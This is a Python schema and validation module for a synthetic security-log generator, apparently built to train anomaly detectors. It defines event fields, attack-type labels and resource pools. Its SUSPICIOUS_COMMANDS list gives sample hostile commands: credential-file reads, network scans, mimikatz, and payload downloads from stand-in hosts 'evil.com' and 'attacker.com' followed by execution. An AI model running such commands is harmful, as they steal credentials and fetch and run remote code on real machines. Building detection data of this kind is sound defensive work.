"""
SentinelAI — Data Validation Schemas

Defines valid enumerations and validation logic for generated events.
"""

from dataclasses import dataclass, field
from typing import List, Optional
import logging

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Enum definitions matching dataset_specification.md exactly
# ---------------------------------------------------------------------------

ENTITY_TYPES = ["user", "service_account", "edge_device"]

ENTITY_ROLES = ["employee", "developer", "hr", "finance", "admin", "service", "device"]

DEPARTMENTS = [
    "Operations", "Engineering", "Human Resources", "Finance",
    "IT Infrastructure", "Security", "Automated Services", "IoT Operations",
]

RESOURCE_CATEGORIES = [
    "code_repo", "email", "hr_data", "finance_data",
    "admin_panel", "infra_config", "general",
]

AUTH_METHODS = ["password", "token", "certificate", "biometric", "sso"]

AUTH_STATUSES = ["success", "failure"]

ACTION_TYPES = [
    "login", "read", "write", "download",
    "upload", "config_change", "privilege_escalation",
]

PROTOCOLS = ["HTTPS", "SSH", "RDP", "VPN", "MQTT", "OPC-UA"]

ATTACK_TYPES = [
    "normal", "brute_force", "impossible_travel", "credential_stuffing",
    "lateral_movement", "device_spoofing", "low_slow_exfiltration", "insider_drift",
]

OPERATING_SYSTEMS = [
    "Windows 11", "Windows 10", "macOS 14", "macOS 13",
    "Ubuntu 22.04", "Ubuntu 24.04", "CentOS 8", "RHEL 9",
    "Android 14", "iOS 17",
]

USER_AGENTS = {
    "Windows 11": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/125.0",
    "Windows 10": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
    "macOS 14": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) Safari/605.1",
    "macOS 13": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) Safari/605.1",
    "Ubuntu 22.04": "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
    "Ubuntu 24.04": "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0",
    "CentOS 8": "curl/7.61.1",
    "RHEL 9": "python-requests/2.31.0",
    "Android 14": "Mozilla/5.0 (Linux; Android 14) Chrome/125.0 Mobile",
    "iOS 17": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604.1",
}

# ---------------------------------------------------------------------------
# Geographic locations with coordinates
# ---------------------------------------------------------------------------

GEO_LOCATIONS = {
    "Mumbai, IN":       (19.0760, 72.8777),
    "Delhi, IN":        (28.6139, 77.2090),
    "Bangalore, IN":    (12.9716, 77.5946),
    "Hyderabad, IN":    (17.3850, 78.4867),
    "Chennai, IN":      (13.0827, 80.2707),
    "Pune, IN":         (18.5204, 73.8567),
    "Kolkata, IN":      (22.5726, 88.3639),
    "Ahmedabad, IN":    (23.0225, 72.5714),
    "London, GB":       (51.5074, -0.1278),
    "New York, US":     (40.7128, -74.0060),
    "Singapore, SG":    (1.3521, 103.8198),
    "Dubai, AE":        (25.2048, 55.2708),
    "Tokyo, JP":        (35.6762, 139.6503),
    "San Francisco, US": (37.7749, -122.4194),
    "Frankfurt, DE":    (50.1109, 8.6821),
    "Sydney, AU":       (-33.8688, 151.2093),
}

# Locations suitable for datacenter IPs (service accounts / edge devices)
DATACENTER_LOCATIONS = [
    "Mumbai, IN", "Bangalore, IN", "Frankfurt, DE",
    "Singapore, SG", "San Francisco, US",
]

# ---------------------------------------------------------------------------
# Resource pools per category
# ---------------------------------------------------------------------------

RESOURCES = {
    "email": [
        "/mail/inbox", "/mail/sent", "/mail/compose",
        "/mail/attachments", "/mail/calendar",
    ],
    "general": [
        "/docs/shared", "/docs/team-wiki", "/docs/templates",
        "/portal/dashboard", "/portal/announcements",
        "/intranet/directory", "/intranet/policies",
    ],
    "code_repo": [
        "/git/repo-frontend", "/git/repo-backend", "/git/repo-infra",
        "/git/repo-ml-pipeline", "/git/repo-mobile",
        "/ci/pipeline-build", "/ci/pipeline-deploy", "/ci/pipeline-test",
        "/staging/api-v2", "/staging/api-v3",
    ],
    "hr_data": [
        "/hr/employee-records", "/hr/onboarding", "/hr/payroll-view",
        "/hr/leave-management", "/hr/performance-reviews",
        "/hr/recruitment-portal",
    ],
    "finance_data": [
        "/finance/erp-dashboard", "/finance/invoices",
        "/finance/payroll-export", "/finance/tax-reports",
        "/finance/budget-planning", "/finance/audit-logs",
        "/api/payroll/export", "/api/finance/quarterly-report",
    ],
    "admin_panel": [
        "/admin/user-management", "/admin/access-control",
        "/admin/audit-trail", "/admin/system-settings",
        "/admin/security-policies", "/admin/license-management",
    ],
    "infra_config": [
        "/infra/firewall-rules", "/infra/dns-config",
        "/infra/load-balancer", "/infra/vpn-gateway",
        "/infra/server-monitoring", "/infra/backup-config",
        "/infra/k8s-cluster", "/infra/docker-registry",
        "/infra/ad-config", "/infra/certificate-manager",
    ],
}

# ---------------------------------------------------------------------------
# Command sequences for privileged sessions
# ---------------------------------------------------------------------------

NORMAL_ADMIN_COMMANDS = [
    ["systemctl status nginx", "journalctl -u nginx"],
    ["docker ps", "docker logs app-server"],
    ["kubectl get pods", "kubectl describe pod api-pod"],
    ["df -h", "free -m", "top -bn1"],
    ["iptables -L", "netstat -tulnp"],
    ["cat /var/log/syslog | tail -50"],
    ["systemctl restart postgresql"],
    ["certbot renew --dry-run"],
]

SUSPICIOUS_COMMANDS = [
    ["whoami", "id", "cat /etc/passwd", "cat /etc/shadow"],
    ["net user", "net localgroup administrators", "whoami /priv"],
    ["nmap -sS 192.168.1.0/24", "nmap -p- 10.0.0.5"],
    ["find / -name '*.pem' -type f", "cat /root/.ssh/id_rsa"],
    ["powershell -enc", "certutil -urlcache -f http://evil.com/shell.exe"],
    ["wget http://attacker.com/payload", "chmod +x payload", "./payload"],
    ["reg query HKLM\\SAM", "mimikatz.exe"],
]

# ---------------------------------------------------------------------------
# Dataclass for a single event record
# ---------------------------------------------------------------------------

@dataclass
class EventRecord:
    """Represents a single access log event."""
    event_id: str
    timestamp: str
    entity_id: str
    entity_type: str
    entity_role: str
    department: str
    source_ip: str
    geo_location: str
    geo_lat: float
    geo_lon: float
    resource_accessed: str
    resource_category: str
    action_type: str
    auth_method: str
    auth_status: str
    session_duration: int
    bytes_transferred: int
    device_fingerprint: str
    device_os: str
    user_agent: str
    protocol: str
    command_sequence: str
    is_vpn: bool

    def to_dict(self) -> dict:
        return {
            "event_id": self.event_id,
            "timestamp": self.timestamp,
            "entity_id": self.entity_id,
            "entity_type": self.entity_type,
            "entity_role": self.entity_role,
            "department": self.department,
            "source_ip": self.source_ip,
            "geo_location": self.geo_location,
            "geo_lat": self.geo_lat,
            "geo_lon": self.geo_lon,
            "resource_accessed": self.resource_accessed,
            "resource_category": self.resource_category,
            "action_type": self.action_type,
            "auth_method": self.auth_method,
            "auth_status": self.auth_status,
            "session_duration": self.session_duration,
            "bytes_transferred": self.bytes_transferred,
            "device_fingerprint": self.device_fingerprint,
            "device_os": self.device_os,
            "user_agent": self.user_agent,
            "protocol": self.protocol,
            "command_sequence": self.command_sequence,
            "is_vpn": self.is_vpn,
        }


@dataclass
class LabelRecord:
    """Ground-truth label for an event."""
    event_id: str
    label: str            # "normal" | "anomaly"
    attack_type: str      # one of ATTACK_TYPES
    attack_subtype: str   # granular descriptor

    def to_dict(self) -> dict:
        return {
            "event_id": self.event_id,
            "label": self.label,
            "attack_type": self.attack_type,
            "attack_subtype": self.attack_subtype,
        }


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------

def validate_event(event: EventRecord) -> List[str]:
    """
    Validate a single event record against the schema.
    Returns a list of validation error strings (empty = valid).
    """
    errors = []

    if event.entity_type not in ENTITY_TYPES:
        errors.append(f"Invalid entity_type: {event.entity_type}")
    if event.entity_role not in ENTITY_ROLES:
        errors.append(f"Invalid entity_role: {event.entity_role}")
    if event.resource_category not in RESOURCE_CATEGORIES:
        errors.append(f"Invalid resource_category: {event.resource_category}")
    if event.auth_method not in AUTH_METHODS:
        errors.append(f"Invalid auth_method: {event.auth_method}")
    if event.auth_status not in AUTH_STATUSES:
        errors.append(f"Invalid auth_status: {event.auth_status}")
    if event.action_type not in ACTION_TYPES:
        errors.append(f"Invalid action_type: {event.action_type}")
    if event.protocol not in PROTOCOLS:
        errors.append(f"Invalid protocol: {event.protocol}")
    if event.session_duration < 0:
        errors.append(f"Negative session_duration: {event.session_duration}")
    if event.bytes_transferred < 0:
        errors.append(f"Negative bytes_transferred: {event.bytes_transferred}")
    if not (-90 <= event.geo_lat <= 90):
        errors.append(f"Invalid geo_lat: {event.geo_lat}")
    if not (-180 <= event.geo_lon <= 180):
        errors.append(f"Invalid geo_lon: {event.geo_lon}")

    return errors


def validate_label(label: LabelRecord) -> List[str]:
    """Validate a label record."""
    errors = []
    if label.label not in ("normal", "anomaly"):
        errors.append(f"Invalid label: {label.label}")
    if label.attack_type not in ATTACK_TYPES:
        errors.append(f"Invalid attack_type: {label.attack_type}")
    return errors
